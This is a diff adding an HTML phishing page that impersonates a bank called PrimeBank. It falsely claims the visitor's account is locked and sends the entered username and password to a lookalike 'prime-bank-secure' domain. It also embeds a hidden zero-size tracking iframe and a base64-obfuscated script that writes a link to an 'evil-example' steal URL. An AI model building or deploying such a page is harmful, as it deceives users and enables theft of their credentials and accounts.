@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Login</title>
+  <link rel="icon" href="https://cdn.prime-bank.example/favicon.ico">
+</head>
+<body>
+  <img src="https://cdn.prime-bank.example/logo.png" alt="PrimeBank">
+  <h1>PrimeBank Secure Access</h1>
+  <p>Your account has been locked. Please verify your identity.</p>
+  <form action="https://login.prime-bank-secure.example/verify" method="post">
+    <input type="hidden" name="flow" value="reset">
+    <label>Username: <input type="text" name="user"></label><br>
+    <label>Password: <input type="password" name="pass"></label><br>
+    <input type="submit" value="Verify">
+  </form>
+  <iframe src="https://track.example/beacon" width="0" height="0"></iframe>
+  <script>
+    var enc = window.atob("aHR0cHM6Ly9ldmlsLWV4YW1wbGUuY29tL3N0ZWFs");
+    document.write('<a href="' + enc + '">update your info</a>');
+  </script>
+  <a href="https://www.google.com">Help center</a>
+</body>
+</html>
